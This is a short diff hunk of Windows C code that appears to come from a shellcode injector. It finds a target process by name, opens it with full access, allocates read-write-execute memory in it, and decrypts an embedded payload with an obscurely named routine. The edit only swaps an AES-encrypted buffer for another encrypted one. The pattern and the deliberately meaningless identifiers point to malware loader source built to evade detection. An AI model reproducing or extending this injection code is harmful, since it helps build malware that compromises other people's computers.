@@ -50,7 +50,7 @@ int main() {
        if (strcmp(pe32.szExeFile, procmantar) == 0){
               HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
               
-              LPVOID clamonua = VirtualAllocEx(hProcess, NULL, AESCodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+              LPVOID clamonua = VirtualAllocEx(hProcess, NULL, kkcodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
               //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
               daggerman101(kkcode, kkcodeLen, kkeyakesey , kkeyakeseyLen);
              
